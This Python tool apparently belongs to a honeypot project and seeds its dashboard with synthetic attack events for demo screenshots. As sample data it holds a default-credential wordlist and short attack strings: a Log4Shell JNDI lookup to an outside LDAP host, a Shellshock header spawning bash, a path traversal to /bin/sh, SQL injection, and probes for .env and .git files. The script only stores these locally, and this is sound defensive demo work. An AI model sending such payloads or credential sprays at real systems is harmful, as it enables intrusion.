"""Generate realistic demo data so the dashboard is populated for screenshots.

This inserts *synthetic* attack events that mirror what a real internet-facing
honeypot sees within hours (SSH credential sprays, HTTP recon, Log4Shell probes,
etc.). Use it for demos and portfolio screenshots without exposing a sensor to
the public internet.

    python -m tools.simulate_attacks --count 600 --days 3
"""

from __future__ import annotations

import argparse
import os
import random
import time

from honeypot.enrich import classify_ip
from honeypot.storage import AttackEvent, Storage

# Credentials lifted from public breach/wordlist top-N — what bots actually try.
USERNAMES = ["root", "admin", "user", "test", "ubuntu", "oracle", "pi",
             "postgres", "ftpuser", "git", "administrator", "support"]
PASSWORDS = ["123456", "password", "admin", "root", "12345678", "qwerty",
             "1234", "raspberry", "toor", "letmein", "P@ssw0rd", "changeme"]

HTTP_PAYLOADS = [
    ("GET /wp-login.php HTTP/1.1", "wordpress_scan"),
    ("GET /.env HTTP/1.1", "env_file_probe"),
    ("GET /.git/config HTTP/1.1", "git_probe"),
    ("GET /phpmyadmin/ HTTP/1.1", "phpmyadmin_scan"),
    ("POST /cgi-bin/.%2e/.%2e/bin/sh HTTP/1.1", "path_traversal"),
    ("GET /?x=${jndi:ldap://1.2.3.4/a} HTTP/1.1", "log4shell"),
    ("GET / HTTP/1.1\r\nUser-Agent: () { :;}; /bin/bash", "shellshock"),
    ("GET /index.php?id=1 UNION SELECT 1,2,3 HTTP/1.1", "sql_injection"),
]

SERVICES = [("SSH", 22), ("HTTP", 80), ("Telnet", 23), ("FTP", 21)]


def random_public_ip() -> str:
    # Avoid private/reserved ranges so the map of "public" attackers looks real.
    while True:
        a = random.randint(1, 223)
        if a in (10, 127, 169, 172, 192):
            continue
        return f"{a}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def make_event(now: float, span: float) -> AttackEvent:
    service, port = random.choices(
        SERVICES, weights=[55, 30, 10, 5], k=1
    )[0]
    ts = now - random.random() * span
    ip = random_public_ip()
    username = password = None
    preview = ""

    if service in ("SSH", "Telnet", "FTP"):
        username = random.choice(USERNAMES)
        password = random.choice(PASSWORDS)
        preview = f"[credential_attack] {username}:{password}"
    else:  # HTTP
        line, cat = random.choice(HTTP_PAYLOADS)
        preview = f"[{cat}] {line}"

    return AttackEvent(
        service=service,
        src_ip=ip,
        src_port=random.randint(1024, 65535),
        dst_port=port,
        ts=ts,
        username=username,
        password=password,
        byte_count=random.randint(20, 800),
        session_ms=random.randint(5, 4000),
        ip_class=classify_ip(ip),
        data_preview=preview,
        data_hex=preview.encode().hex(),
    )


def main() -> None:
    parser = argparse.ArgumentParser(description="Seed demo honeypot data")
    parser.add_argument("--count", type=int, default=600)
    parser.add_argument("--days", type=float, default=3.0)
    parser.add_argument("--data-dir", default=os.getcwd())
    args = parser.parse_args()

    storage = Storage(
        db_path=os.path.join(args.data_dir, "honeypot.db"),
        jsonl_path=os.path.join(args.data_dir, "events.jsonl"),
    )
    now = time.time()
    span = args.days * 86400
    for _ in range(args.count):
        storage.record(make_event(now, span))
    print(f"  seeded {args.count} synthetic events over {args.days} days "
          f"into {args.data_dir}")
    storage.close()


if __name__ == "__main__":
    main()
